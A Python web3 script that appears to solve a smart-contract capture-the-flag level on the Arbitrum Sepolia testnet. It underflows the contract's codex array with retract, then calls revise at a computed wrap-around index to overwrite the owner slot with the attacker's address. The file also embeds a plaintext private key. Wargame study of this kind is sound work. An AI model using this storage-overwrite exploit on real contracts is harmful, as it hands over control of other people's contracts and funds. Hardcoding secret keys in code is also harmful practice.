from web3 import Web3
from eth_account.account import Account, SignedTransaction

import time

provider_url = "https://sepolia-rollup.arbitrum.io/rpc"
w3 = Web3(Web3.HTTPProvider(provider_url))

main_private_key = "0x4c93e99df964f043149b68ae9d6c994e684f0cacec41becbd5da0a082629684c"
main_account = w3.eth.account.from_key(main_private_key)

abi = """[
    {
        "constant": false,
        "inputs": [],
        "name": "makeContact",
        "outputs": [],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {
                "name": "_content",
                "type": "bytes32"
            }
        ],
        "name": "record",
        "outputs": [],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [],
        "name": "renounceOwnership",
        "outputs": [],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [],
        "name": "retract",
        "outputs": [],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {
                "name": "i",
                "type": "uint256"
            },
            {
                "name": "_content",
                "type": "bytes32"
            }
        ],
        "name": "revise",
        "outputs": [],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {
                "name": "newOwner",
                "type": "address"
            }
        ],
        "name": "transferOwnership",
        "outputs": [],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "anonymous": false,
        "inputs": [
            {
                "indexed": true,
                "name": "previousOwner",
                "type": "address"
            },
            {
                "indexed": true,
                "name": "newOwner",
                "type": "address"
            }
        ],
        "name": "OwnershipTransferred",
        "type": "event"
    },
    {
        "constant": true,
        "inputs": [
            {
                "name": "",
                "type": "uint256"
            }
        ],
        "name": "codex",
        "outputs": [
            {
                "name": "",
                "type": "bytes32"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "contact",
        "outputs": [
            {
                "name": "",
                "type": "bool"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "isOwner",
        "outputs": [
            {
                "name": "",
                "type": "bool"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    },
    {
        "constant": true,
        "inputs": [],
        "name": "owner",
        "outputs": [
            {
                "name": "",
                "type": "address"
            }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
    }
]"""
contract_address = "0x3E4D52e61aeB5A17179A8B5e1666dC604b8530D8"
contract_instance = w3.eth.contract(address=contract_address, abi=abi)

func = getattr(contract_instance.functions, 'makeContact')()
tx = func.build_transaction({'nonce': w3.eth.get_transaction_count(main_account.address), 'value': 0, 'gas': 1000000, 'gasPrice': w3.eth.gas_price})
sign_tx: SignedTransaction = Account.sign_transaction(tx, main_private_key)
tx_hash = w3.eth.send_raw_transaction(sign_tx.raw_transaction)

origin_hash = int(Web3.keccak(hexstr="0x0000000000000000000000000000000000000000000000000000000000000002").hex(),16)
calc_hash = hex(2**256-origin_hash)
print(calc_hash)
# dynamic storage offset=memory[keccak(slot)+length],let keccak(slot)+length=0
fake_owner = "0x"+main_account.address[2:].rjust(64,"0")

# print(fake_owner)

# let codex.length = max uint256
func = getattr(contract_instance.functions, 'retract')()

tx = func.build_transaction({'nonce': w3.eth.get_transaction_count(main_account.address)+1, 'value': 0, 'gas': 1000000, 'gasPrice': w3.eth.gas_price})
sign_tx: SignedTransaction = Account.sign_transaction(tx, main_private_key)
tx_hash = w3.eth.send_raw_transaction(sign_tx.raw_transaction)


func = getattr(contract_instance.functions, 'revise')(int(calc_hash,16),fake_owner)

tx = func.build_transaction({'nonce': w3.eth.get_transaction_count(main_account.address)+1, 'value': 0, 'gas': 1000000, 'gasPrice': w3.eth.gas_price})
sign_tx: SignedTransaction = Account.sign_transaction(tx, main_private_key)
tx_hash = w3.eth.send_raw_transaction(sign_tx.raw_transaction)
